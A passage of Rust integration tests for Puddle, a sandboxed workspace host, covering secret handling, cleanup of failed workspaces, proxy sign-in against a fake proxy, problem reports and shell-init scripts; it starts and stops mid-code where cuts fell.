    for id in rig.secrets.ids() {
        rig.secrets
            .delete(&puddle_secrets::StoredId::new(&id).unwrap())
            .unwrap();
    }
    let reply = api.post("/api/workspaces", &new_workspace("acme")).await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    let detail = end["detail"].as_str().unwrap();
    assert!(
        detail.contains("TOKEN") && detail.contains("Environment tab"),
        "{detail}"
    );
    assert!(!detail.contains(REAL));
    assert!(
        host.workspaces().termination(&name("acme")).is_none(),
        "nothing is registered"
    );

    // Setting the secret again fixes it.
    put_env(
        &api,
        "/api/env/TOKEN",
        secret_body(Some(REAL), &["a.example.org"]),
    )
    .await;
    create(&api, &mut events, "again").await;
    assert!(host.workspaces().termination(&name("again")).is_some());
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn the_variables_puddle_adds_to_keep_the_users_value_and_the_ones_it_owns_stay_puddles() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    put_env(
        &api,
        "/api/env/JAVA_TOOL_OPTIONS",
        json!({"kind": "plain", "value": "-Xmx1g"}),
    )
    .await;
    put_env(
        &api,
        "/api/env/DOCKER_CONFIG",
        json!({"kind": "plain", "value": "/data/docker"}),
    )
    .await;
    // A name Puddle owns cannot be set through the API; a hand-edited database row is ignored in
    // favour of Puddle's own value.
    host.store()
        .set_env(
            &puddle_store::EnvScope::Global,
            &puddle_store::EnvName::existing("HTTPS_PROXY").unwrap(),
            puddle_store::EnvDraft::plain("http://elsewhere:1").unwrap(),
        )
        .unwrap();
    create(&api, &mut events, "acme").await;

    let env = rig.guest.boot_envs.lock().unwrap().last().cloned().unwrap();
    let java = env.get("JAVA_TOOL_OPTIONS").unwrap();
    assert!(java.starts_with("-Xmx1g "), "{java}");
    assert!(java.contains("-Dhttp.proxyHost=127.0.0.1"), "{java}");
    assert_eq!(env.get("HTTPS_PROXY"), Some("http://127.0.0.1:3128"));
    // The Docker CLI's proxy settings follow `DOCKER_CONFIG` to where the user put it.
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    assert!(!files.contains_key("/root/.docker/config.json"));
    assert!(
        guest_has(&rig, "/data/docker/config.json"),
        "the Docker CLI's proxy settings did not follow DOCKER_CONFIG"
    );
    assert!(!guest_has(&rig, "/root/.docker/config.json"));
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn deleting_a_workspace_removes_its_variables_rules_and_the_values_of_its_own_secrets() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    put_env(
        &api,
        "/api/env/GLOBAL_TOKEN",
        secret_body(Some(REAL), &["g.example.org"]),
    )
    .await;
    create(&api, &mut events, "acme").await;
    put_env(
        &api,
        "/api/workspaces/acme/env/OWN_TOKEN",
        secret_body(Some(REAL), &["o.example.org"]),
    )
    .await;
    put_env(
        &api,
        "/api/workspaces/acme/env/EDITOR",
        json!({"kind": "plain", "value": "nano"}),
    )
    .await;
    host.store()
        .add_rule(&puddle_store::NewRule {
            scope: puddle_store::Scope::Workspace(name("acme")),
            pattern: puddle_store::Pattern::parse("example.org").unwrap(),
            effect: puddle_store::Effect::Allow,
            expires_at: None,
            created_by: puddle_store::Actor::Cli,
        })
        .unwrap();
    assert_eq!(rig.secrets.ids().len(), 2);

    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let reply = api
        .delete(
            "/api/workspaces/acme",
            Some(&json!({"confirm": true}).to_string()),
        )
        .await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    events.until(ended("acme"), Duration::from_secs(20)).await;

    // The workspace's own secret is gone from the credential store, the global one stays.
    eventually("the workspace's value is removed", APPLY, || {
        rig.secrets.ids().len() == 1
    })
    .await;
    assert!(
        host.store()
            .env_entries(&puddle_store::EnvScope::Workspace(name("acme")))
            .unwrap()
            .is_empty()
    );
    assert_eq!(
        host.store()
            .env_entries(&puddle_store::EnvScope::Global)
            .unwrap()
            .len(),
        1
    );
    assert!(host.store().rules().is_empty(), "its rules went with it");

    // A new workspace of the same name starts clean, with the global secret only.
    create(&api, &mut events, "acme").await;
    let env = rig.guest.boot_envs.lock().unwrap().last().cloned().unwrap();
    assert!(env.get("OWN_TOKEN").is_none() && env.get("EDITOR").is_none());
    assert!(env.get("GLOBAL_TOKEN").is_some());
    host.shutdown().await;
}

// ---- follow-up failures reach the user, not only the host's log -------------------------------

fn disk_error(op: &'static str) -> puddle_compute::ComputeError {
    puddle_compute::ComputeError::Runtime {
        op,
        message: "no space left on device".into(),
    }
}

/// The problems `GET /api/problems` lists, as (key, workspace, title, detail).
async fn problems_of(api: &Api) -> Vec<(String, Option<String>, String, String)> {
    let reply = api.get("/api/problems").await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    reply.json()["problems"]
        .as_array()
        .unwrap()
        .iter()
        .map(|p| {
            (
                p["key"].as_str().unwrap().to_owned(),
                p["workspace"].as_str().map(str::to_owned),
                p["title"].as_str().unwrap().to_owned(),
                p["detail"].as_str().unwrap().to_owned(),
            )
        })
        .collect()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_failed_sync_that_cannot_be_cleaned_up_names_what_is_left_in_the_failure() {
    let rig = Rig::new();
    rig.guest.fail_sync.store(true, Ordering::SeqCst);
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    rig.runtime
        .inject(Op::RemoveVolume, Fault::always(disk_error("remove volume")));
    api.post("/api/workspaces", &new_workspace("acme")).await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    let detail = end["detail"].as_str().unwrap();
    assert!(detail.contains("sync: I/O error"), "the cause: {detail}");
    assert!(detail.contains("could not clean up"), "{detail}");
    assert!(
        detail.contains("the new volume ws-"),
        "what is left: {detail}"
    );
    assert!(detail.contains("no space left"), "why: {detail}");
    assert!(detail.contains("next start"), "the way out: {detail}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_failed_boot_that_cannot_be_cleaned_up_names_what_is_left_in_the_failure() {
    let rig = Rig::new();
    rig.guest.fail_boot.store(true, Ordering::SeqCst);
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    rig.runtime
        .inject(Op::RemoveVolume, Fault::always(disk_error("remove volume")));
    api.post("/api/workspaces", &new_workspace("acme")).await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    let detail = end["detail"].as_str().unwrap();
    assert!(detail.contains("boot hook"), "the cause: {detail}");
    assert!(detail.contains("could not clean up"), "{detail}");
    assert!(detail.contains("no space left"), "why: {detail}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn stale_git_locks_that_could_not_be_cleared_are_a_problem_until_a_boot_clears_them() {
    let rig = Rig::new();
    *rig.guest.locks_answer.lock().unwrap() = Some((3, "E\t.\tcannot enter /workspaces/acme\n"));
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let problems = problems_of(&api).await;
    assert_eq!(problems.len(), 1, "{problems:?}");
    let (key, workspace, title, detail) = &problems[0];
    assert_eq!(key, "git-locks:acme");
    assert_eq!(workspace.as_deref(), Some("acme"));
    assert!(title.contains("stale git lock"), "{title}");
    assert!(detail.contains("cannot enter"), "the reason: {detail}");
    assert!(detail.contains("deleted by hand"), "the way out: {detail}");

    *rig.guest.locks_answer.lock().unwrap() = None;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(problems_of(&api).await, []);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_trim_that_failed_at_stop_and_a_stop_that_had_to_be_forced_are_problems_the_next_run_ends()
 {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    rig.guest.fail_trim.store(true, Ordering::SeqCst);
    rig.runtime
        .force_next_stop(&SandboxName::new("acme").unwrap());
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let problems = problems_of(&api).await;
    let keys: Vec<_> = problems.iter().map(|p| p.0.as_str()).collect();
    assert_eq!(keys, ["forced-stop:acme", "trim:acme"], "{problems:?}");
    assert!(problems[0].3.contains("not written"), "{problems:?}");
    assert!(
        problems[1].3.contains("not supported"),
        "the reason: {problems:?}"
    );
    assert!(
        problems[1].3.contains("Reclaim space"),
        "the way out: {problems:?}"
    );

    // Starting it again ends the forced stop; a stop whose trim works ends the other.
    rig.guest.fail_trim.store(false, Ordering::SeqCst);
    api.post("/api/workspaces/acme/start", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    let keys: Vec<_> = problems_of(&api).await.into_iter().map(|p| p.0).collect();
    assert_eq!(keys, ["trim:acme"]);
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(problems_of(&api).await, []);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn what_reconcile_kept_removed_or_could_not_do_at_start_is_listed_with_the_way_out() {
    let rig = Rig::new();
    rig.runtime
        .create_volume(puddle_compute::VolumeSpec {
            name: WorkspaceId::new("lost").unwrap().volume_name(),
            size: puddle_compute::DiskSize::mib(1024),
        })
        .await
        .unwrap();
    for ghost in ["ghost", "stuck"] {
        rig.runtime
            .create(puddle_compute::SandboxSpec::new(
                SandboxName::new(ghost).unwrap(),
                ImageRef::new(FakeRuntime::DEBIAN).unwrap(),
            ))
            .await
            .unwrap();
    }
    // "stuck" cannot be removed: the record it has is locked.
    rig.runtime.inject(
        Op::Remove,
        Fault::always(puddle_compute::ComputeError::Runtime {
            op: "remove",
            message: "the record is locked".into(),
        })
        .only_for("stuck"),
    );

    let host = rig.start().await;
    let problems = problems_of(&api(&host)).await;
    let keys: Vec<_> = problems.iter().map(|p| p.0.as_str()).collect();
    assert_eq!(
        keys,
        [
            "reconcile-failures",
            "reconcile-removed-sandboxes",
            "reconcile-unknown-volumes"
        ],
        "{problems:?}"
    );
    assert!(problems[0].3.contains("stuck"), "{problems:?}");
    assert!(problems[0].3.contains("record is locked"), "{problems:?}");
    assert!(problems[1].3.contains("ghost"), "{problems:?}");
    assert!(problems[1].3.contains("untouched"), "{problems:?}");
    assert!(problems[2].3.contains("ws-lost"), "{problems:?}");
    assert!(problems[2].3.contains("kept them"), "{problems:?}");
    host.shutdown().await;
}

/// A GitHub identity with a stored token, so a repository listing makes one request to
/// `api.github.com`.
async fn add_github_identity(api: &Api, token: &str) {
    let stored = api
        .post(
            "/api/credentials/stored",
            &json!({"host": "github.com", "token": token}).to_string(),
        )
        .await;
    assert_eq!(stored.status, 201, "{}", stored.body);
    let source = stored.json()["source"].clone();
    let made = api
        .post(
            "/api/identities",
            &json!({
                "label": "Ada",
                "author": {"name": "Ada", "email": "ada@example.org"},
                "credentials": [{
                    "host": "github.com",
                    "source": source,
                    "covers": {"owners": [], "rest_of_host": true}
                }]
            })
            .to_string(),
        )
        .await;
    assert_eq!(made.status, 201, "{}", made.body);
}

/// A host whose discovery answers a company proxy at `proxy` (a PAC says so), signing in with
/// the Basic password `password`.
async fn host_behind_proxy(
    rig: &Rig,
    proxy: &puddle_upstream::FakeProxy,
    password: &str,
) -> Host<FakeRuntime> {
    let mut config = rig.config();
    config.upstream.basic = Some(puddle_upstream::Credentials::new("svc", password));
    host_behind_proxy_with(rig, proxy, config).await
}

/// Like [`host_behind_proxy`], with the Basic sign-in left to the stored ones.
async fn host_behind_proxy_without_a_configured_password(
    rig: &Rig,
    proxy: &puddle_upstream::FakeProxy,
) -> Host<FakeRuntime> {
    host_behind_proxy_with(rig, proxy, rig.config()).await
}

async fn host_behind_proxy_with(
    rig: &Rig,
    proxy: &puddle_upstream::FakeProxy,
    config: HostConfig,
) -> Host<FakeRuntime> {
    let os = FakeOs::new(ProxyConfig {
        pac_url: Some("http://pac.corp/p.pac".into()),
        ..ProxyConfig::default()
    });
    let hops = vec![puddle_upstream::Hop::Proxy(proxy.proxy_addr())];
    os.set_pac(move |_| Ok(hops.clone()));
    let prepared = prepare(config, &FakePlatform::new(&rig.log)).unwrap();
    let mut options = hermetic_options();
    options.secret_store = Some(rig.secrets.clone());
    options.dev_cert = Some(rig.dev_cert.clone() as Arc<dyn DevCertSource>);
    options.discovery = Some(Discovery::new(os, puddle_upstream::Config::default()));
    Host::start(prepared, &FakeFactory::new(&rig.runtime, &rig.log), options)
        .await
        .unwrap()
}

#[tokio::test(flavor = "multi_thread")]
async fn a_sign_in_to_the_company_proxy_shows_in_the_served_network_health_report() {
    use puddle_upstream::{Behaviour, FakeProxy};
    let rig = Rig::new();
    let right = fixture::password("right");
    // The proxy asks for Basic once, then answers the CONNECT with "no such host": nothing
    // leaves the test.
    let proxy = FakeProxy::start(Behaviour::Basic {
        user: "svc".into(),
        password: right.clone(),
    })
    .await;
    let host = host_behind_proxy(&rig, &proxy, &right).await;
    let api = api(&host);

    let before = api.get("/api/network-health").await.json();
    assert_eq!(before["sign_in"]["attempts"], json!([]), "{before}");

    add_github_identity(&api, "ghp_unused_token").await;
    let listing = api.get("/api/repos").await.json();
    assert_eq!(listing["sources"][0]["state"], "failed", "{listing}");

    let reply = api.get("/api/network-health").await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    fixture::assert_absent("the network-health reply", &reply.body, &right);
    let report = reply.json();
    assert!(
        report["sign_in"]["methods"]
            .as_array()
            .unwrap()
            .contains(&json!("basic")),
        "{report}"
    );
    let attempts = report["sign_in"]["attempts"].as_array().unwrap();
    assert_eq!(attempts.len(), 1, "{report}");
    assert_eq!(attempts[0]["proxy"], proxy.proxy_addr().to_string());
    assert_eq!(attempts[0]["scheme"], "Basic");
    assert_eq!(attempts[0]["result"], "signed_in");
    assert!(attempts[0]["at"].as_u64().unwrap() > 0, "{report}");
    // The proxy received the Basic credentials on a CONNECT for the listing's host. Which requests
    // came before is not asserted: a platform that can sign in without being asked (Windows
    // Negotiate) sends its own token first.
    let seen = proxy.seen();
    let expected = format!("Basic {}", base64(format!("svc:{right}").as_bytes()));
    let signed_in = seen.iter().any(|request| {
        request.method == "CONNECT"
            && request.target == "api.github.com:443"
            && request.proxy_authorization.as_deref() == Some(expected.as_str())
    });
    assert!(
        signed_in,
        "the proxy never saw the Basic sign-in on a CONNECT"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_refused_sign_in_shows_as_failed_without_the_password() {
    use puddle_upstream::{Behaviour, FakeProxy};
    let rig = Rig::new();
    let wrong = fixture::password("wrong");
    let proxy = FakeProxy::start(Behaviour::Basic {
        user: "svc".into(),
        password: fixture::password("right"),
    })
    .await;
    let host = host_behind_proxy(&rig, &proxy, &wrong).await;
    let api = api(&host);

    add_github_identity(&api, "ghp_unused_token").await;
    let listing = api.get("/api/repos").await.json();
    assert_eq!(listing["sources"][0]["state"], "failed", "{listing}");

    let reply = api.get("/api/network-health").await;
    assert_eq!(reply.status, 200, "{}", reply.body);
    fixture::assert_absent("the network-health reply", &reply.body, &wrong);
    let report = reply.json();
    let attempts = report["sign_in"]["attempts"].as_array().unwrap();
    assert_eq!(attempts.len(), 1, "{report}");
    assert_eq!(attempts[0]["proxy"], proxy.proxy_addr().to_string());
    assert_eq!(attempts[0]["scheme"], "Basic");
    assert_eq!(attempts[0]["result"], "failed");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn listing_the_repositories_of_an_identity_is_in_the_activity_log_as_puddles_own_request() {
    use puddle_upstream::{Behaviour, FakeProxy, Hop};
    let rig = Rig::new();
    // The company proxy refuses every connection, so no request leaves the test.
    let proxy = FakeProxy::start(Behaviour::Refuse(502)).await;
    let os = FakeOs::new(ProxyConfig {
        pac_url: Some("http://pac.corp/p.pac".into()),
        ..ProxyConfig::default()
    });
    let hops = vec![Hop::Proxy(proxy.proxy_addr())];
    os.set_pac(move |_| Ok(hops.clone()));
    let prepared = prepare(rig.config(), &FakePlatform::new(&rig.log)).unwrap();
    let mut options = hermetic_options();
    options.secret_store = Some(rig.secrets.clone());
    options.dev_cert = Some(rig.dev_cert.clone() as Arc<dyn DevCertSource>);
    options.discovery = Some(Discovery::new(os, puddle_upstream::Config::default()));
    let host = Host::start(prepared, &FakeFactory::new(&rig.runtime, &rig.log), options)
        .await
        .unwrap();
    let api = api(&host);
    add_github_identity(&api, "ghp_CANARY_listing_token").await;

    let listing = api.get("/api/repos").await.json();
    assert_eq!(listing["sources"][0]["state"], "failed", "{listing}");
    assert_eq!(listing["sources"][0]["problem"]["code"], "unreachable");

    let records: Vec<serde_json::Value> = host
        .store()
        .audit_lines(0, 1000)
        .unwrap()
        .into_iter()
        .filter_map(|(_, line)| serde_json::from_str(&line).ok())
        .filter(|v: &serde_json::Value| v["type"] == "connection" && v["host"] == "api.github.com")
        .collect();
    assert_eq!(records.len(), 1, "{records:?}");
    assert_eq!(records[0]["origin"], "puddle", "{records:?}");
    assert!(records[0]["workspace"].is_null(), "{records:?}");
    assert_eq!(records[0]["port"], 443, "{records:?}");
    assert_eq!(
        records[0]["reason"], "puddle_request_failed:unreachable",
        "{records:?}"
    );
    assert!(!records[0].to_string().contains("CANARY"), "{records:?}");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_failed_image_pull_that_cannot_be_cleaned_up_names_what_is_left() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    rig.runtime.inject(
        Op::PullImage,
        Fault::once(puddle_compute::ComputeError::ImagePull {
            image: "x".into(),
            reason: "offline".into(),
        }),
    );
    rig.runtime
        .inject(Op::RemoveVolume, Fault::always(disk_error("remove volume")));
    api.post("/api/workspaces", &new_workspace("acme")).await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    let detail = end["detail"].as_str().unwrap();
    assert!(detail.contains("offline"), "the cause: {detail}");
    assert!(
        detail.contains("remove the new volume"),
        "what is left: {detail}"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_workspace_that_cannot_make_its_folder_is_taken_down_again_and_the_leftovers_are_named() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    rig.guest.fail_layout.store(true, Ordering::SeqCst);
    // Taking the machine down fails too: it may still run, and its record stays.
    rig.runtime
        .inject(Op::Stop, Fault::once(disk_error("stop")).only_for("acme"));
    rig.runtime.inject(
        Op::Remove,
        Fault::once(disk_error("remove")).only_for("acme"),
    );
    api.post("/api/workspaces", &new_workspace("acme")).await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    let detail = end["detail"].as_str().unwrap();
    assert!(
        detail.contains("read-only file system"),
        "the cause: {detail}"
    );
    assert!(detail.contains("may still be running"), "{detail}");
    assert!(detail.contains("sandbox acme was not removed"), "{detail}");
    assert!(detail.contains("next start"), "the way out: {detail}");

    // Without the faults, the same failure on a start of an existing workspace ends crashed.
    rig.guest.fail_layout.store(false, Ordering::SeqCst);
    let reply = api.post("/api/workspaces", &new_workspace("other")).await;
    assert_eq!(reply.status, 202, "{}", reply.body);
    events.until(ended("other"), Duration::from_secs(20)).await;
    api.post("/api/workspaces/other/stop", "").await;
    events.until(ended("other"), Duration::from_secs(20)).await;
    rig.guest.fail_layout.store(true, Ordering::SeqCst);
    api.post("/api/workspaces/other/start", "").await;
    let end = events.until(ended("other"), Duration::from_secs(20)).await;
    assert_eq!(end["step"], "failed", "{end}");
    assert!(
        end["detail"].as_str().unwrap().contains("read-only"),
        "{end}"
    );
    assert_eq!(
        status_of(&api.get("/api/workspaces/other").await),
        "crashed"
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn locks_that_could_not_be_removed_one_by_one_are_listed_in_the_problem() {
    let rig = Rig::new();
    *rig.guest.locks_answer.lock().unwrap() =
        Some((0, "E\tapi/.git/index.lock\tPermission denied\nD\n"));
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    let problems = host.problems().list();
    assert_eq!(problems.len(), 1, "{problems:?}");
    assert!(
        problems[0]
            .detail
            .contains("api/.git/index.lock: Permission denied"),
        "{problems:?}"
    );
    host.shutdown().await;
}

/// Waits until the host has read its stored proxy sign-ins (it does so off the start-up path).
async fn proxy_sign_ins_loaded(host: &Host<FakeRuntime>, count: usize) {
    for _ in 0..200 {
        if host.proxy_passwords().proxies().len() == count {
            return;
        }
        tokio::time::sleep(Duration::from_millis(25)).await;
    }
    assert_eq!(
        host.proxy_passwords().proxies().len(),
        count,
        "the proxy sign-ins were not loaded"
    );
}

#[tokio::test(flavor = "multi_thread")]
async fn a_stored_proxy_sign_in_answers_the_proxy_and_is_there_after_a_restart() {
    use puddle_upstream::{Behaviour, FakeProxy};
    let rig = Rig::new();
    let stored = fixture::password("stored");
    let proxy = FakeProxy::start(Behaviour::Basic {
        user: "svc".into(),
        password: stored.clone(),
    })
    .await;
    let host = host_behind_proxy_without_a_configured_password(&rig, &proxy).await;
    proxy_sign_ins_loaded(&host, 0).await;
    host.proxy_passwords()
        .set(&proxy.proxy_addr(), "svc", &stored)
        .unwrap();
    let api = api(&host);
    add_github_identity(&api, "ghp_unused_token").await;
    let _ = api.get("/api/repos").await;
    let seen = proxy.seen();
    let expected = format!("Basic {}", base64(format!("svc:{stored}").as_bytes()));
    assert!(
        seen.iter().any(|request| request.method == "CONNECT"
            && request.target == "api.github.com:443"
            && request.proxy_authorization.as_deref() == Some(expected.as_str())),
        "the proxy never saw the stored sign-in on a CONNECT"
    );
    host.shutdown().await;
    drop(host);

    // A second run finds it in the credential store, and nothing but the store holds it.
    let again = host_behind_proxy_without_a_configured_password(&rig, &proxy).await;
    proxy_sign_ins_loaded(&again, 1).await;
    assert_eq!(
        again.proxy_passwords().proxies(),
        [(proxy.proxy_addr(), "svc".to_owned())]
    );
    let settings = std::fs::read_dir(rig.dir.path())
        .into_iter()
        .flatten()
        .flatten()
        .filter(|e| e.path().extension().is_some_and(|x| x == "json"))
        .map(|e| std::fs::read_to_string(e.path()).unwrap_or_default())
        .collect::<String>();
    fixture::assert_absent("the settings files", &settings, &stored);
    again.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_proxy_that_turns_the_sign_in_down_is_one_event_and_a_failed_attempt() {
    use puddle_upstream::{Behaviour, FakeProxy};
    let rig = Rig::new();
    let wrong = fixture::canary("wrong");
    let proxy = FakeProxy::start(Behaviour::Basic {
        user: "svc".into(),
        password: fixture::password("right"),
    })
    .await;
    let host = host_behind_proxy(&rig, &proxy, &wrong).await;
    let mut events = host.events().subscribe();
    let api = api(&host);
    add_github_identity(&api, "ghp_unused_token").await;
    // Two listings, each retrying the same wrong password: one episode.
    let _ = api.get("/api/repos").await;
    let _ = api.get("/api/repos").await;

    // The host forwards the failure from its own task, so the event can land after the replies:
    // wait for the first one, then give a second (which must not come) a moment to show.
    let sign_in_failure = |event| match event {
        Event::ProxySignInFailed { proxy, scheme } => Some((proxy, scheme)),
        _ => None,
    };
    let first = next_event_matching(
        "the sign-in failure on the event stream",
        Duration::from_secs(10),
        &mut events,
        sign_in_failure,
    )
    .await;
    let failures = vec![first];
    no_event_matching(
        "a second sign-in failure in the same episode",
        Duration::from_millis(500),
        &mut events,
        sign_in_failure,
    )
    .await;
    assert_eq!(
        failures,
        [(proxy.proxy_addr().to_string(), Some("Basic".to_owned()))]
    );
    let report = api.get("/api/network-health").await;
    fixture::assert_absent("the network-health reply", &report.body, &wrong);
    assert_eq!(report.json()["sign_in"]["attempts"][0]["result"], "failed");
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_credential_store_that_cannot_be_read_at_start_is_a_problem_until_the_next_start() {
    let rig = Rig::new();
    rig.secrets.break_it();
    let host = rig.start().await;
    let mut raised = false;
    for _ in 0..200 {
        raised = host
            .problems()
            .list()
            .iter()
            .any(|p| p.key == "proxy-sign-in-store");
        if raised {
            break;
        }
        tokio::time::sleep(Duration::from_millis(25)).await;
    }
    assert!(raised, "{:?}", host.problems().list());
    host.shutdown().await;
    drop(host);

    // The store is back: the next start reads the sign-ins and raises nothing.
    rig.secrets.heal();
    let again = rig.start().await;
    tokio::time::sleep(Duration::from_millis(300)).await;
    assert!(
        again
            .problems()
            .list()
            .iter()
            .all(|p| p.key != "proxy-sign-in-store"),
        "{:?}",
        again.problems().list()
    );
    again.shutdown().await;
}

// ---- shell init -------------------------------------------------------------------------------

/// The folder the guest sees a workspace's shell init in, on the host.
fn shell_init_folder(rig: &Rig, workspace: &str) -> PathBuf {
    rig.dir
        .path()
        .join("data")
        .join("guest-share")
        .join("shell-init")
        .join(workspace)
}

async fn put_shell_init(api: &Api, workspace: &str, content: &str) -> support::Reply {
    api.put(
        &format!("/api/workspaces/{workspace}/shell-init"),
        &json!({ "content": content }).to_string(),
    )
    .await
}

fn is_event(kind: &'static str, workspace: &'static str) -> impl Fn(&serde_json::Value) -> bool {
    move |e| e["type"] == kind && e["workspace"] == workspace
}

#[tokio::test(flavor = "multi_thread")]
async fn a_saved_shell_init_reaches_a_running_workspace_read_only_and_through_a_file_puddle_owns() {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;

    // Nothing saved yet: the folder is there and empty, and the login shells load it all the same.
    assert_eq!(
        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).unwrap(),
        ""
    );
    let files = rig.guest.plan_files(rig.guest.boots() - 1);
    let loader = pem_of(&files, "/etc/profile.d/02-puddle-shell-init.sh");
    assert!(loader.contains(". /puddle/shell-init/init.sh"), "{loader}");
    let read = api.get("/api/workspaces/acme/shell-init").await;
    assert_eq!(read.status, 200, "{}", read.body);
    assert_eq!(read.json()["saved"], false);
    assert_eq!(read.json()["content"], "");

    // A save in a running workspace is checked in the guest, then published at once.
    let saved = put_shell_init(&api, "acme", "export EDITOR=vim\r\n").await;
    assert_eq!(saved.status, 200, "{}", saved.body);
    assert_eq!(saved.json()["checked"], true);
    assert_eq!(saved.json()["shell_init"]["content"], "export EDITOR=vim\n");
    events
        .until(
            is_event("workspace_shell_init_changed", "acme"),
            Duration::from_secs(20),
        )
        .await;
    eventually("the folder holds the saved text", APPLY, || {
        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).ok()
            == Some("export EDITOR=vim\n".to_owned())
    })
    .await;
    assert_eq!(
        rig.guest.checks.lock().unwrap()[0].0,
        "export EDITOR=vim\n",
        "the guest was handed the script to check"
    );
    // The change reached the guest without booting it again.
    assert_eq!(rig.guest.boots(), 1);

    // Removing it empties the file again; removing what is not there is a 404.
    assert_eq!(
        api.delete("/api/workspaces/acme/shell-init", None)
            .await
            .status,
        204
    );
    eventually("the folder is empty again", APPLY, || {
        std::fs::read_to_string(shell_init_folder(&rig, "acme").join("init.sh")).ok()
            == Some(String::new())
    })
    .await;
    assert_eq!(
        api.delete("/api/workspaces/acme/shell-init", None)
            .await
            .status,
        404
    );
    assert_eq!(
        api.get("/api/workspaces/nobody/shell-init").await.status,
        404
    );
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_script_that_prints_or_does_not_parse_is_refused_with_what_was_seen_and_nothing_is_saved()
{
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;

    *rig.guest.check_answer.lock().unwrap() = Some((66, "hello from my init\n"));
    let loud = put_shell_init(&api, "acme", "echo hello from my init").await;
    assert_eq!(loud.status, 422, "{}", loud.body);
    assert!(
        loud.body.contains("It printed: hello from my init"),
        "{}",
        loud.body
    );
    *rig.guest.check_answer.lock().unwrap() = Some((65, "line 1: syntax error"));
    let broken = put_shell_init(&api, "acme", "if then").await;
    assert_eq!(broken.status, 422, "{}", broken.body);
    assert!(broken.body.contains("does not parse"), "{}", broken.body);
    assert_eq!(
        api.get("/api/workspaces/acme/shell-init").await.json()["saved"],
        false
    );

    // Text the store refuses never reaches the guest.
    let before = rig.guest.checks.lock().unwrap().len();
    for refused in ["", "  \n", "a\u{0}b"] {
        assert_eq!(put_shell_init(&api, "acme", refused).await.status, 422);
    }
    assert_eq!(rig.guest.checks.lock().unwrap().len(), before);
    host.shutdown().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn a_stopped_workspace_takes_a_save_unchecked_and_the_start_mounts_it_checks_it_and_raises_a_problem_if_it_prints()
 {
    let rig = Rig::new();
    let host = rig.start().await;
    let api = api(&host);
    let mut events = api.events().await;
    create(&api, &mut events, "acme").await;
    api.post("/api/workspaces/acme/stop", "").await;
    events.until(ended("acme"), Duration::from_secs(20)).await;

    let saved = put_shell_init(&api, "acme", "echo loud\n").await;
    assert_eq!(saved.status, 200, "{}", saved.body);
    assert_eq!(saved.json()["checked"], false);
    assert!(
        saved.json()["unchecked_reason"]
            .as_str()
            .unwrap()
            .contains("not running"),
        "{}",
        saved.body
    );
    assert_eq!(rig.guest.checks.lock().unwrap().len(), 0);

    *rig.guest.check_answer.lock().unwrap() = Some((66, "loud\n"));
    api.post("/api/workspaces/acme/start", "").await;
    let end = events.until(ended("acme"), Duration::from_secs(20)).await;
    assert_eq!(
        end["step"], "done",
        "a script that prints does not stop the start: {end}"
    );
    // The guest saw the mounted file, with the saved text, when the check ran.
